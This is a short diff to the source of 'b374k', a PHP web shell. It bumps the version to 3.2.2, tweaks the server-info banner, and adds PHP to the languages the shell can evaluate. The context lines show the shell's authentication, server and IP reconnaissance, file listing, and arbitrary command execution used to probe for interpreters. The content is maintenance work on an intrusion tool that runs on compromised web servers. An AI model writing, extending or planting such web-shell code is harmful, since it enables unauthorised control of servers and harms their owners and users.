@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.2.1";
+$GLOBALS['ver'] = "3.2.2";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -50,7 +50,7 @@ if(!function_exists('auth')){
 if(!function_exists('get_server_info')){
 	function get_server_info(){
 		$server_info['uname'] = php_uname();
-		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')."<span class='strong'>|</span> ":'';
+		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
 		$server_info['software'] = $server_software."  PHP ".phpversion();
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
 		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
@@ -765,6 +765,8 @@ if(!function_exists('show_all_files')){
 if(!function_exists('eval_get_supported')){
 	function eval_get_supported(){
 		$eval_supported = array();
+		
+		$eval_supported[] = "php";
 
 		$check = strtolower(execute("python -h"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "python";
